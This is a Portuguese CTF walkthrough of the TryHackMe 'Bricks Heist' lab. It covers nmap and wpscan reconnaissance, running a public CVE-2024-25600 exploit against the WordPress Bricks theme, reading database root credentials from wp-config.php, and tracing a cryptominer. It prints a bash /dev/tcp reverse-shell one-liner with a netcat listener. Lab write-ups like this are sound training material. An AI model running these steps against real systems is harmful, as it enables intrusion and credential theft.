---
title: "TryHackMe: Bricks Heist"
author: "Eduardo Araujo"
categories: [CTF]
tags: [tryhackme, nmap, wp-scan, wordpress, netcat, python, reverse-shell]
render_with_liquid: false
image:
  path: /images/seguranca/tryhackme/ctf/brick heist/bricks_heist.svg
---

Acesso: [TryHack3M: Bricks Heist](https://tryhackme.com/room/tryhack3mbricksheist)

*Crack the code, command the exploit! Dive into the heart of the system with just an RCE CVE as your key.*

<hr>

<br>

A sala pede para adicionar `<ip> bricks.thm` ao nosso arquivo `/etc/hosts` para resolver o DNS do alvo em nossa máquina. Adicione manualmente (abra o arquivo /etc/hosts e adicione `<ip> bricks.thm`) ou execute o comando a seguir:

~~~sh
echo "<ip> bricks.thm" | sudo tee -a /etc/hosts
~~~

## CONEXÃO
O primeiro passo é testar a sua conexão com o alvo. Faça um simples teste de `ping` e verifique se retorna pacotes

![ping](../images/seguranca/tryhackme/ctf/brick%20heist/1%20pinghost.png)

Teste o nome de host para verificar se ele resolve o nome `bricks.thm`

![ping name](../images/seguranca/tryhackme/ctf/brick%20heist/2%20pingname.png)

<hr>

## QUESTÃO 01

**What is the content of the hidden .txt file in the web folder?**
*Tradução: Qual é o conteúdo do .txt escondido na pasta web?*

Pela pergunta provavelmente um serviço web está sendo executado no alvo, isso faz mais sentido ainda pelo fato dele pedir para adicionar `bricks.thm` ao nosso arquivo de resolução DNS. Nesse caso, vamos fazer um *fuzzing* de diretórios. Mas antes, é uma boa prática coletar mais informações do alvo.

### SCAN


Faça uma varredura no alvo para descobrir quais portas e quais serviços estão sendo executados. A ferramenta `nmap` faz esse trabalho de forma sensacional. Existem muitas formas de usar o nmap e isso depende do como nosso alvo se comporta. Nesse exemplo vou executar o seguinte comando:

~~~sh
nmap -v -A <alvo> -oN <arquivo de resultado>
~~~

Onde: <br>
    `-v` modo verboso: mostra todas as informações durante a varredura; <br>
    `-A` extrai todas as informações possíveis do alvo, como OS, versão de serviços e protocolos; <br>
    `-oN` manda salvar o resultado em um arquivo externo

~~~sh
nmap -v -A 10.10.138.58 -oN scan.txt
~~~

O resultado é esse:
~~~txt
Nmap scan report for bricks.thm (10.10.138.58)
Host is up (0.29s latency).
Not shown: 996 closed tcp ports (conn-refused)

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2d:29:94:c6:cb:31:46:29:22:67:3f:fc:e3:27:53:9f (RSA)
|   256 66:76:59:93:52:92:8d:73:1e:50:0b:91:98:e1:0c:3f (ECDSA)
|_  256 28:bf:31:bb:fe:3e:2d:dc:ff:35:43:1c:ea:25:e4:9a (ED25519)

80/tcp   open  http     WebSockify Python/3.8.10
|_http-title: Error response
|_http-server-header: WebSockify Python/3.8.10
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 405 Method Not Allowed
|     Server: WebSockify Python/3.8.10
|     Date: Thu, 10 Apr 2025 01:11:15 GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 472
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 405</p>
|     <p>Message: Method Not Allowed.</p>
|     <p>Error code explanation: 405 - Specified method is invalid for this resource.</p>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 501 Unsupported method ('OPTIONS')
|     Server: WebSockify Python/3.8.10
|     Date: Thu, 10 Apr 2025 01:11:16 GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 500
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 501</p>
|     <p>Message: Unsupported method ('OPTIONS').</p>
|     <p>Error code explanation: HTTPStatus.NOT_IMPLEMENTED - Server does not support this operation.</p>
|     </body>
|_    </html>

443/tcp  open  ssl/http Apache httpd
| tls-alpn: 
|   h2
|_  http/1.1
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
| Issuer: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-04-02T11:59:14
| Not valid after:  2025-04-02T11:59:14
| MD5:   f1df:99bc:d5ab:5a5a:5709:5099:4add:a385
|_SHA-1: 1f26:54bb:e2c5:b4a1:1f62:5ea0:af00:0261:35da:23c3
|_http-server-header: Apache
|_http-title: Brick by Brick
|_http-favicon: Unknown favicon MD5: 000BF649CC8F6BF27CFB04D1BCDCD3C7
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: WordPress 6.5

3306/tcp open  mysql    MySQL (unauthorized)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

~~~

Identificado os seguintes serviços: <br>
    - `ssh` (porta 22) <br>
    - `http` (porta 80): rodando em cima de Python e parece que não aceita requisições do tipo GET <br>
    - `https` (porta 443): rodando em cima do Apache e parece ser uma página Wordpress na versão 6.5; O arquivo robots.txt restringe acesso ao wp-admin <br>
    - `mysql` (porta 3306): um banco de dados MySQL para armazenar os dados da aplicação. Pelo fato de possuir apache e mysql podemos deduzir que possa existir um *phpmyadmin* <br>

A primeira `flag` que o sala pede está um arquivo num diretório na página web. Como acabamos de confirmar que tem um serviço web sendo executado no alvo, vamos tirar a prova de vista

Acesse: http://bricks.htm

![http page](../images/seguranca/tryhackme/ctf/brick%20heist/6%20http%20error%20page.png)

Esse erro já era esperado, o próprio nmap retornou esse HTML no resultado do scan. 


Agora acessando o mesmo domínio mas no *https*

![https page](../images/seguranca/tryhackme/ctf/brick%20heist/3%20https%20page.png)

Bingo!

![title wp](../images/seguranca/tryhackme/ctf/brick%20heist/5%20title%20wp.png)

Confirmando que se trata do CMS Wordpress. Sendo assim, podemos validar se os desenvolvedores esconderam a página padrão que fica em `/wp-admin` ou se foram ingênuos o suficiente para deixar exposto:

![wp-admin](../images/seguranca/tryhackme/ctf/brick%20heist/8%20wp-admin.png)

    💡 Além do ssh temos um possível vetor de ataque de força bruta (bruteforce) nessa página. Ainda precisamos descobrir o nome do usuário (ou tentar com os genéricos: admin ou root).

Quando você se depara com uma aplicação web sempre verifique o código fonte, as vezes pode encontrar informações importantes como senhas, usuários, mensagens, tokens e etc.

Vá até a página principal e pressione `CRTL + U` para exibir o código fonte. Veja que conseguimos achar mais diretórios...

![source code](../images/seguranca/tryhackme/ctf/brick%20heist/4%20source%20code.png)

Verificando o conteúdo de `/robots.txt`

![robots](../images/seguranca/tryhackme/ctf/brick%20heist/7%20robots.png)

Olha que interessante, existem uma sub-página depois de `/wp-admin`

![admin-ajax](../images/seguranca/tryhackme/ctf/brick%20heist/9%20admin-ajax.png)

Mas não retorna nada de interessante também.

Coletamos algumas informações do alvo e como você viu existem páginas padrões que não foram devidamente tratadas, assim como existem scripts explicitos nos códigos fontes das páginas. Sendo assim temos algumas opções: fazer um *fuzzing* de diretório para descobrir se existem mais diretórios ocultos (para isso podemos usar ferramentas como ffuf, wfuzz, gobuster, dirb e etc) ou como se trata de um Wordpress podemos buscar vulnerabilidades específicas desse CMS usando a ferramenta `wp-scan`. Nessa situação, prefiro a segunda opção de usar o `wp-scan` por ser mais direto ao ponto, além do fato do nmap ter "dedurado" a versão do Wordpress, isso pode nos ajudar a encontrar possíveis CVEs 

### WPSCAN

O wp-scan é um ferramenta construída em Ruby que faz a enumeração de possíveis vulnerabilidades relacionadas ao Wordpress. Sendo assim, depois de instalar em seu computador (no Kali ele vem instalado) faça a atualização da base de dados dele executando:

~~~sh
wpscan --update
~~~

Em seguida vamos enumerar nosso alvo:

~~~sh
wpscan --url https://bricks.thm
~~~

![wpscan ssl error](../images/seguranca/tryhackme/ctf/brick%20heist/11%20wpscan%20ssl%20error.png)


    🤔 Ele deu um erro estranho de certifcado ssl... confesso que nunca tinha visto esse erro. 

Após uma rápida pesquisa, notei que podemos contornar esse erro adicionando o parâmetro: `--disable-tls-checks`

~~~sh
wpscan -url https://bricks.thm --disable-tls-checks
~~~

O resultado do scan:

~~~text
Interesting Finding(s):

[+] Headers
 | Interesting Entry: server: Apache
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: https://bricks.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://bricks.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://bricks.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://bricks.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5 identified (Insecure, released on 2024-04-02).
 | Found By: Rss Generator (Passive Detection)
 |  - https://bricks.thm/feed/, <generator>https://wordpress.org/?v=6.5</generator>
 |  - https://bricks.thm/comments/feed/, <generator>https://wordpress.org/?v=6.5</generator>

[+] WordPress theme in use: bricks
 | Location: https://bricks.thm/wp-content/themes/bricks/
 | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
 | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
 | Style Name: Bricks
 | Style URI: https://bricksbuilder.io/
 | Description: Visual website builder for WordPress....
 | Author: Bricks
 | Author URI: https://bricksbuilder.io/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.9.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:10 <====================> (137 / 137) 100.00% Time: 00:00:10

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
~~~

Honestamente analisando as informações não vi muita coisa relevante. Contudo, algo a se prestar atenção é nos plugins e suas versões. É comum plugins terem vulnerabilidades conhecidas. 

![cve theme](../images/seguranca/tryhackme/ctf/brick%20heist/12%20cve%20theme.png)

Após uma rápida pesquisa veja que existem vulnerabilidades para o tema Bricks nessa versão. 

![github repo cve](../images/seguranca/tryhackme/ctf/brick%20heist/13%20github%20repo%20exploit.png)

### EXPLOITING

Faça o download desse arquivo .py e execute contra o alvo.

    🛈 leia o arquivo, verifique e instale todas as bibliotecas python que ele está importando. Se preciso, ative um ambiente virtual para não causar conflito de pacotes

Como ativar o ambiente virtual:
~~~sh
python3 -m venv meu_venv
source meu_venv/bin/activate  # Linux/Mac
meu_venv\Scripts\activate     # Windows
~~~

Pacotes sugeridos:
~~~sh
pip install requests beautifulsoup4 rich prompt_toolkit alive_progress
~~~

Agora sim explore o alvo:

~~~sh
python3 CVE-2024-25600.py -u https://bricks.thm
~~~

![shell](../images/seguranca/tryhackme/ctf/brick%20heist/14%20shell.png)

Entramos! Conseguimos a shell!

![arquivo oculto](../images/seguranca/tryhackme/ctf/brick%20heist/15%20arquivo%20oculto.png)

Após listar o diretório encontramos muitos arquivos. Arquivos importantes de configuração .php e um deles é o .txt com a primeira flag

<br>

![flag1](../images/seguranca/tryhackme/ctf/brick%20heist/16%20flag1.png)

⚑ Conseguimos a primeira flag.


Nesse mesmo diretório existe o arquivo `wp-config.php` e felizmente conseguimos ler. Contém os dados do usuário root do banco de dados:

![phpmyadmin](../images/seguranca/tryhackme/ctf/brick%20heist/myadmin%20root.png)

Acessamos! Podemos alterar e fazer qualquer registro no banco! 

<br>

### SHELL REVERSA (OPCIONAL)

Essa parte é opcional: notei que minha conexão com a shell do alvo cai a todo instante. Primeiro até pensei que fosse algo haver com a venv do python ou algum detalhe na conexão da VPN. Mas na verdade é a shell do alvo que é muito instável. Nesse caso você pode receber a shell em seu computador para melhorar a experiência, caso contrário você vai precisar ficar se reconectando no alvo a cada 2-3 minutos.

Para fazer isso abra uma conexão em seu computador usando o netcat:

`nc -lvnp <porta qualquer>`

~~~sh
nc -lvnp 6080
~~~

Acesse a shell do alvo novamente e rode:

~~~sh
bash -c 'exec bash -i &>/dev/tcp/<SEU IP>/<SUA PORTA DEFINIDA NO NETCAT> <&1'
~~~

No meu caso:

~~~sh
bash -c 'exec bash -i &>/dev/tcp/10.21.163.71/6080 <&1'
~~~

    🛈 O seu IP nesse caso é de conexão com o laborátorio do TryHackMe, ou seja, o da VPN.

## QUESTÃO 02

**What is the name of the suspicious process?**
*Tradução: Qual é o nome do processo suspeito?*

Agora que estamos na shell do sistema, podemos analisar a lista de processos sendo executado.

![services](../images/seguranca/tryhackme/ctf/brick%20heist/17%20service%20runnig.png)

A descrição de um dos processos está marcado com um `TRYHACK3M` porém essa não é a nossa `flag`. ⚑ Contudo, a questão 03 pergunta qual é o nome do serviço que está associado ao processo suspeito, nesse caso **achamos a resposta da questão 03** 

    🛈 nome do processo é diferente do nome do serviço

Nessa tela não temos detalhes o suficiente para descobrir o nome do processo. Podemos descobrir mais detalhes dando um `cat` no serviço: `systemctl cat [service]`

![flag2](../images/seguranca/tryhackme/ctf/brick%20heist/18%20flag2.png)

⚑ Achamos a flag da questão 02


## QUESTÃO 03

**What is the service name affiliated with the suspicious process?**
*Tradução: Qual é o nome do serviço que está associado com o processo suspeito*

Essa flag 03 já foi encontrada anteriormente. Após executar o comando que a sala deu como dica, verifique a coluna **unit.name**

## QUESTÃO 04

**What is the log file name of the miner instance?**
*Tradução: Qual é o nome do arquivo de log da instância mineradora?*

    🤔 mineradora? confesso que também estou confuso.

Basicamente ele quer saber o nome do arquivo de log desse serviço que está executando o Miner ou algo assim. Como visto antes, aparentemente esse serviço está no diretório `/lib/NetworkManager` então

~~~sh
cd /lib/NetworkManager && ls
~~~

![flag4](../images/seguranca/tryhackme/ctf/brick%20heist/19%20ls%20network.png)

Dê um `cat` nesses arquivos e veja qual tem conteúdo com `Miner` sendo executado

## QUESTÃO 05

**What is the wallet address of the miner instance?**
*Tradução: Qual é o endereço da carteira da instância mineradora?*

Bom, agora pelo contexto da pergunta é possível ver que estamos lidando com carteiras de criptomoedas e mineração. No próprio arquivo de log, nas primeiras linhas você vai encontra um `ID: <numero randomico gigante>` esse é o endereço da carteira. Mas endereços de carteira são codificadas. Então use decodificadores online que identifiquem essa codificação automáticamente, como o site do [CyberChef](https://gchq.github.io/CyberChef/). Você vai reparar que vai ser gerado dois endereços, mas apenas um deles é correto.


## QUESTÃO 06

**The wallet address used has been involved in transactions between wallets belonging to which threat group?**
*Tradução: O endereço de carteira usado esteve envolvido em transações entre carteiras pertencentes a qual grupo de ameaças?*

Para responder essa questão, simplesmente pesquise no google ou alguma IA sobre o endereço dessa carteira estar associado a algum grupo de ameaças cibernéticas. Outra dica é usar o site da [blockhain](https://www.blockchain.com/explorer/) para descobrir se essa carteira foi usada em transações de grande volume (verifique a carteira de origem e destino)